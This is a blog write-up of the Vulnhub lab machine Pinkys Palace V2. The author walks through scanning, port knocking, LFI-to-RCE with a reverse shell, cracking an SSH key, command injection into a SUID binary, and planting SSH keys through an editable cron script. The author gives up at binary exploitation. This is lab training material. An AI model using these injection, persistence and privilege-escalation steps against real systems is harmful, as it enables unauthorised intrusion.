---
title: Pinkys Palace V2
categories: [Vulnhub]
tags: [boot2root]
---

# Machine Information

- [Pinkys Palace V2](https://www.vulnhub.com/entry/pinkys-palace-v2,229/)
- Author: `Pink_Panther`

## Host discovery

- target IP: `10.10.10.130`

## Information Gathering

Nmap Time

```bash
nmap -p- -T4 10.10.10.130 -A -oA 10.10.10.130   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 14:45 +08
Nmap scan report for 10.10.10.130
Host is up (0.0011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:0D:46:C6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms 10.10.10.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.32 seconds
```

## Exploiting Port 80

Before starting to check the website, there is a note where I need to run this command in my own terminal to render the website.

```bash
echo 10.10.10.130 pinkydb | sudo tee -a /etc/hosts 
10.10.10.130 pinkydb
```

After adding it, the website will be rendering properly. I then start to play around with the website.

![](/assets/img/posts/2024-02-05-pinkys-palace-2/2024-02-05-pinkys-palace-2-14-51-14.png)

The website shows that it is a wordpress website. I then run `wp-scan` and `gobuster` to get some useful information while I continue to search for more information.

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.130 -x bak,zip,txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.130
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.hta.bak             (Status: 403) [Size: 295]
/.hta.zip             (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 300]
/.hta.txt             (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess.zip        (Status: 403) [Size: 300]
/.htpasswd.zip        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htaccess.bak        (Status: 403) [Size: 300]
/.htpasswd.bak        (Status: 403) [Size: 300]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.10.130/]
/license.txt          (Status: 200) [Size: 19935]
/secret               (Status: 301) [Size: 313] [--> http://10.10.10.130/secret/]
/server-status        (Status: 403) [Size: 300]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.130/wordpress/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.10.130/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.10.130/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.10.130/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

I noticed that there is a `/secret` directory which might contains useful information. After looking into it, it contains a text file and inside the text file, it has some weird content.

```bash
curl http://pinkydb/secret/bambam.txt 
8890
7000
666

pinkydb
```

As for the result of `wpscan`, I managed to get a username from the result.

```bash
wpscan --url http://10.10.10.130/  -e u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.130/ [10.10.10.130]
[+] Started: Mon Feb  5 15:03:49 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.130/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.130/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.130/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.130/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.130/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] pinky1337
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Feb  5 15:03:51 2024
[+] Requests Done: 37
[+] Cached Requests: 18
[+] Data Sent: 9.557 KB
[+] Data Received: 180.469 KB
[+] Memory used: 153.883 MB
[+] Elapsed time: 00:00:01
```

Now that I have username and a random text file, I tried to use the text file information as password to try and login. I did not managed to login with the text file information. I noticed that the text file information contains numbers only which looks like some ports. After searching around, I think that the numbers might be for port knocking. I then start to try and see if its possible.

```bash
apt install knockd #(if command not found)
knock 10.10.10.130 666 7000 8890
knock 10.10.10.130 666 8890 7000
knock 10.10.10.130 7000 666 8890
knock 10.10.10.130 7000 8890 666
knock 10.10.10.130 8890 666 7000
knock 10.10.10.130 8890 7000 666
```

Although the ports are provided, I still do not know the sequence. It is better to just port knock all the possible combination. **After performing each port knocking sequence, run nmap again to check for the opened ports.**

```bash
nmap -p- -T4 10.10.10.130 -A -oA 10.10.10.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 15:28 +08
Nmap scan report for pinkydb (10.10.10.130)
Host is up (0.00083s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Pinkys Database
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94SVN%I=7%D=2/5%Time=65C08E32%P=x86_64-pc-linux-gnu%r
SF:(NULL,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x2
SF:0is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace
SF:\.\n=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemo
SF:n\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0int
SF:o\x20Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n")%r(SIP
SF:Options,138,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This
SF:\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Pal
SF:ace\.\n=>\x20\0OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x2
SF:0nm;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>
SF:\r\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\
SF:r\nContent-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applic
SF:ation/sdp\r\n\r\n")%r(GenericLines,5D,"\[\+\]\x20Welcome\x20to\x20The\x
SF:20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor
SF:\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0\r\n\r\n")%r(HTTPOptions,6F,"\
SF:[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon
SF:\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\
SF:0OPTIONS\x20/\x20HTTP/1\.0\r\n\r\n")%r(RTSPRequest,6F,"\[\+\]\x20Welcom
SF:e\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x2
SF:0our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OPTIONS\x20/\x
SF:20RTSP/1\.0\r\n\r\n")%r(RPCCheck,5A,"\[\+\]\x20Welcome\x20to\x20The\x20
SF:Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n
SF:\0into\x20Pinky's\x20Palace\.\n=>\x20\0\x80")%r(DNSVersionBindReqTCP,59
SF:,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20s
SF:oon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x
SF:20\0")%r(DNSStatusRequestTCP,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daem
SF:on\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0in
SF:to\x20Pinky's\x20Palace\.\n=>\x20\0")%r(Help,5F,"\[\+\]\x20Welcome\x20t
SF:o\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x
SF:20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0HELP\r\n");
MAC Address: 00:0C:29:0D:46:C6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms pinkydb (10.10.10.130)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
```

After knocking for several times, the filtered port will changed to opened when the correct port is knocked. Now I have 3 more ports to focus. 

## Exploting port 7654

This is another websites which I could only access after performing port knocking. 

![](/assets/img/posts/2024-02-05-pinkys-palace-2/2024-02-05-pinkys-palace-2-15-52-01.png)

After searching around, I found a new login page. I tried to login by performing attacks. I managed to login with `pinky:Passione`. The password is actually the title of a blog in wordpress. It is better to use `cewl` to grep all the words in a website to create a password list for brute forcing credentials. 

![](/assets/img/posts/2024-02-05-pinkys-palace-2/2024-02-05-pinkys-palace-2-16-03-12.png)

When I logged it, I noticed there's 2 links that might be useful. Aside from that, I also notice something else which is the URL parameter. It might be vulnerable to LFI.

![](/assets/img/posts/2024-02-05-pinkys-palace-2/2024-02-05-pinkys-palace-2-16-06-09.png)

As for the 2 links, I managed to get something more useful.

```bash
curl http://pinkydb:7654/credentialsdir1425364865/notes.txt
- Stefano
- Intern Web developer
- Created RSA key for security for him to login

curl http://pinkydb:7654/credentialsdir1425364865/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BAC2C72352E75C879E2F26CC61A5B6E7

lyydl9wiTvUrlM7SXBKgMEP5tCK70Rce65i9sr7rxHmWm91uzd2GYBgSqGRIiPLP
hJdRi8HyRIz+1tf2FPoBvkjWl+WyRPpoVovXfEjL6lVvak6W1eNOuaGBjKT+8eaF
JC62d1ozuEM2eqpPcsVp8puwzP8Q77zYpZK9IOUo3xiupv4RrnBEGPYjaC1lLFRo
zlvUtoTnRQ0QCrjYuaL7EYQ1iBWoNc5ZMn1gqhBqQ/oE7/ff4eGhtG2i1LdscVf9
syk6ZBWFFA1wqlb2Vgv5Mn5BHx27GILo7o6yZzyxAuc02oJBnrg5Btlu/Tyx8ADV
ZR70DVA3q+/UoinxJCvH3zdKzOgzqHR9rdj5hiO6Np0Qzg//aWagrij5GqBpjCEt
aY2GxxXQQ8flNelYMvdcjHvZrjW8rKwU0nhyalu0+nFnLnHH6tMvAE6oqeIxIOO6
iJD7yUTrGfz0T7lRJQ7KQfeDQH+KGKgibLi60XWKQanRmrCiMLKnidLCjctyqsgh
lm5gPpqzw8CuPQ3EqPWIHYoDPak7Mk6SfpZaC+HQRauMbQqy5crP9YTtU1ZqRgdq
MsW7gnawwpTiE2cAR+AW9Cmy/n+cWoDvn+ceSrT1q81AjL1rKFSmwLWjKiKgJHER
Kv3zSMoBEzOGKAnQ5UOwOZPX+qQVGba+CJ2sZMdynd9HZrcMD29H4CLGO+VFggqs
3XUvpIcT4Arx9fVIk3hs6XeAnCOhj5f9Q2F4JnbqPdkQzBNJHCnrE8Rl4ymQl6lF
y/hvGWmDEtbockdNHGH9vF22kZuNmGKRROfYN5pmJYD9/L3RIvcC+UGDVojeUt/A
GDvjS8QhfNRwDUwTYHSUmIkz4fQt8g2bp3EixA/EH9IXV0HoBEtPzeaclqJJRBpW
WZK54Uj51hoqymDTfhS5HAwS6XaiN+SXyfXbZAqHMOTlegYNsGsYpGMXIB1oK+OL
lSwZimExQ042jVe4gxZ0ku3Qh/utmGUf3Rf7Ksng42tSt6uaVblXxO1JRPrI/ARt
5b7CjPBBZtIXUbtPF0/mw0q0tVZH/9BWjTvvAiMPlBvFwmujGKS+BA1krTz6YErY
ifoKTISVWsz7H1p4Xn1YD0sqfFtm2TSzsDj+x1Bpw4KXwquAoRfL61F6hVQKhyaV
8H6XaJCKuj8W2RhSe32pO7/MNYyCatZz5OtUt0XHYGf2EEOkihq8hecXpzHK0pnL
RcfhpffVDMjVV70Sl54WM9mqLHRzUWZZhAUehZkKrsou0LHoTrkWkYShrT1sc7uI
LoiicfuXpWegqXYKLSTY6YVn5iKov/eE3W3mxD/MIO4Fmi4VAcCp2EwXUlwQY8jI
839VYkApkA31uNNfp4GQw7ANqsopjN6bKIPpp8FVdCbgg7DlGZUuf/4cnXOc6gDA
K4+6vpcwC4AnJVsBfgjOmWajYple0zmDkQNkj+UptG8uC7VDwcd4FBfP+ISO1LID
MtLdf1/3qMbDQsqbdHXtZs2P84CvbJ2CPfHvTrG30JfXWuZoinMXtGwxY7x/IR0V
EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
-----END RSA PRIVATE KEY-----
```

It's a id_rsa key. This is an direct access to shell using ssh without any credentials. I then decided to try and see if its possible to get a shell with LFI before using the id_rsa.

![](/assets/img/posts/2024-02-05-pinkys-palace-2/2024-02-05-pinkys-palace-2-16-13-23.png)

By using this [script](https://github.com/synacktiv/php_filter_chain_generator), I managed to get RCE with just using LFI and php wrapper. With that, I could just get a reverse shell as well.

```bash
nc -nvlp 7735        
listening on [any] 7735 ...
connect to [10.10.10.128] from (UNKNOWN) [10.10.10.130] 48838
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ export TERM=xterm
export TERM=xterm
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ ^Z
zsh: suspended  nc -nvlp 7735
```

With that, I managed to get a shell without using the id_rsa

## Privilege Escalation

I started out looking in home directory to get some useful information.

```bash
www-data@Pinkys-Palace:/home/stefano/tools$ ls
note.txt  qsub
www-data@Pinkys-Palace:/home/stefano/tools$ cat note.txt 
Pinky made me this program so I can easily send messages to him.
www-data@Pinkys-Palace:/home/stefano/tools$ ls -la 
total 28
drwxr-xr-x 2 stefano stefano   4096 Mar 17  2018 .
drwxr-xr-x 4 stefano stefano   4096 Mar 17  2018 ..
-rw-r--r-- 1 stefano stefano     65 Mar 16  2018 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub
```

Based on the note, `qsub` is be a program and the program has pinky SUID set. This means that I could just escalate to user pinky with this program. Lets understand and see this program by sending it back to our machine and analyze it with ghidra.

```c
undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  size_t sVar2;
  uint __flags;
  size_t __n;
  void *__buf;
  char local_58 [64];
  __uid_t local_18;
  __gid_t local_14;
  char *local_10;
  
  if (param_1 < 2) {
    printf("%s <Message>\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_10 = getenv("TERM");
  printf("[+] Input Password: ");
  __isoc99_scanf(&DAT_00100cb5,local_58);
  sVar2 = strlen(local_58);
  if (0x28 < sVar2) {
    puts("Bad hacker! Go away!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = strcmp(local_58,local_10);
  if (iVar1 == 0) {
    printf("[+] Welcome to Question Submit!");
    local_14 = getegid();
    local_18 = geteuid();
    setresgid(local_14,local_14,local_14);
    __buf = (void *)(ulong)local_18;
    __flags = local_18;
    setresuid(local_18,local_18,local_18);
    send((int)param_2[1],__buf,__n,__flags);
    return 0;
  }
  puts("[!] Incorrect Password!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Based on the result provided by ghidra, it seems that the password is checked using the environment `TERM`. lets check my own result first using my own shell.

```bash
echo $TERM                             
xterm-256color
```

Since this is my own environment `TERM` result, I tried to use this as the password to check if it working or not.

```bash
www-data@Pinkys-Palace:/home/stefano/tools$ ./qsub
bash: ./qsub: Permission denied
```

Somehow, I could not execute the file as my current user is `www-data` and group `www-data` only could read the file but not execute. This means that I will still need to use the id_rsa to login as `stefano`.

```bash
chmod 400 id_rsa 
ssh2john id_rsa > hash                               
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secretz101       (id_rsa)     
1g 0:00:00:00 DONE (2024-02-05 16:39) 1.639g/s 2140Kp/s 2140Kc/s 2140KC/s secter..secreto28
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Since the id_rsa is protected by password, I tried to get the password before login.

```bash
ssh -i id_rsa stefano@10.10.10.130 -p 4655
Enter passphrase for key 'id_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ 
```

Now that I logged in as stefano, I tried to run the program.

```bash
stefano@Pinkys-Palace:~/tools$ ./qsub 
./qsub <Message>
stefano@Pinkys-Palace:~/tools$ ./qsub "hi"
[+] Input Password: xterm-256color
[+] Welcome to Question Submit!
```

This proved that my theory is correct. But then I have no idea what is happening behind. I then continue to check for ghidra result.

```c
ssize_t send(int __fd,void *__buf,size_t __n,int __flags)

{
  int iVar1;
  undefined4 extraout_var;
  undefined4 in_register_0000003c;
  char *local_10;
  
  asprintf(&local_10,"/bin/echo %s >> /home/pinky/messages/stefano_msg.txt",
           CONCAT44(in_register_0000003c,__fd));
  iVar1 = system(local_10);
  return CONCAT44(extraout_var,iVar1);
}
```

In the `send` function, I saw that it is actually using `/bin/echo` to send message. I could just exploit this by performing command injection. 

```bash
stefano@Pinkys-Palace:~/tools$ ./qsub "hi;/bin/bash -p;"
[+] Input Password: xterm-256color
hi
pinky@Pinkys-Palace:~/tools$ whoami
pinky
```

With this method, I managed to escalate to user pinky. Time for another round of information gathering.

```bash
pinky@Pinkys-Palace:/home/pinky$ cat .bash_history 
ls -al
cd
ls -al
cd /usr/local/bin
ls -al
vim backup.sh 
su demon
pinky@Pinkys-Palace:/home/pinky$ ls -la /usr/local/bin/backup.sh 
-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:/home/pinky$ cat /usr/local/bin/backup.sh 
cat: /usr/local/bin/backup.sh: Permission denied
pinky@Pinkys-Palace:/home/pinky$ id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)

```

I managed to get some useful information and found `backup.sh` but then I could not read the content or execute it as I am user pinky but not group. My only options is to just get both user and group pinky with the help of ssh.

```bash
ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): ./generate_id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./generate_id_rsa
Your public key has been saved in ./generate_id_rsa.pub
The key fingerprint is:
SHA256:8YGpEu1nydOoNu00Yq0R9uUX4M3KYL5eUt4K1M92x0g root@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|     .   o       |
|    . . + o      |
|     o o O =     |
|    . = S B + E  |
|     o % O = o o |
|      B X * * o o|
|     o B * + . . |
|      ..+ .      |
+----[SHA256]-----+

cat generate_id_rsa.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAMehMC5k7dlmhEgiL1C1+zwbGa6MaIMVwQCO/U7N+E6 root@kali

# in ssh terminal
pinky@Pinkys-Palace:/home/pinky$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAMehMC5k7dlmhEgiL1C1+zwbGa6MaIMVwQCO/U7N+E6 root@kali" > /home/pinky/.ssh/authorized_keys
```

Now that everything is set, just ssh as pinky will do.

```bash
ssh -i generate_id_rsa pinky@10.10.10.130 -p 4655    
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
pinky@Pinkys-Palace:~$ cat /usr/local/bin/backup.sh 
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```

Now that I could read the file, I tried to understand it. Since this does not have any SUID bit set, I assumed it might have things to do with cronjob. I then tried to check and see if my assumption is correct or no.

```bash
./pspy32s 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

2024/02/05 01:05:01 CMD: UID=0     PID=1703   | /usr/sbin/CRON -f 
2024/02/05 01:05:01 CMD: UID=0     PID=1704   | /usr/sbin/CRON -f 
2024/02/05 01:05:01 CMD: UID=1001  PID=1705   | /bin/bash /usr/local/bin/backup.sh 
2024/02/05 01:05:01 CMD: UID=1001  PID=1706   | /bin/bash /usr/local/bin/backup.sh 
2024/02/05 01:05:01 CMD: UID=1001  PID=1707   | /bin/bash /usr/local/bin/backup.sh 
2024/02/05 01:05:01 CMD: UID=1001  PID=1708   | tar cvzf /home/demon/backups/backup.tar.gz /var/www/html 
2024/02/05 01:05:01 CMD: UID=1001  PID=1709   | gzip 
```

by using `pspy` script, I saw the cronjob running and executing the `backup.sh` with UID 1001. after checking in `/etc/passwd` user demon has UID 1001 which means that the script is running as daemon but the file is owned by pinky. This means that I could modify the script and escalate to user daemon. 

```bash
pinky@Pinkys-Palace:~$ cat /usr/local/bin/backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
mkdir /home/demon/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAMehMC5k7dlmhEgiL1C1+zwbGa6MaIMVwQCO/U7N+E6 root@kali" > /home/demon/.ssh/authorized_keys
/bin/bash -p
```

I added the last 3 lines, which add my own public key into demon's directory for SSH purposes as well as trying to run a bash shell if its possible. 

```bash
ssh -i generate_id_rsa demon@10.10.10.130 -p 4655
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~$ 
```

After awhile, I managed ssh into user demon although I could not spawn a shell directly. Another round of information gathering ~

```bash
demon@Pinkys-Palace:~$ find / -user demon 2>/dev/null | grep -Ev '/proc|/sys|/user'
/dev/pts/1
/daemon
/daemon/panel
/home/demon
/home/demon/backups
/home/demon/backups/backup.tar.gz
/home/demon/.wget-hsts
/home/demon/pspy32s
/home/demon/.bashrc
/home/demon/.profile
/home/demon/.bash_logout
/home/demon/.ssh
/home/demon/.ssh/authorized_keys
/usr/local/bin/backup.sh
```

After searching for some information, I noticed that a file ,`/daemon/panel` is owned by user demon. Since the file is an executable, another round of getting the file and analyze with ghidra. After understanding it, It seems like a buffer overflow on port 31337 but I will need to write my own shell. (This part I have no idea what is happening as THIS IS NOW BINARY EXPLOITATION). I just give up at this point after looking for everything (including writeups) after 1 hours ++

## Things I learned from the machine

- port knocking
- check cronjob with pspy
- I CANT DO BINEXP


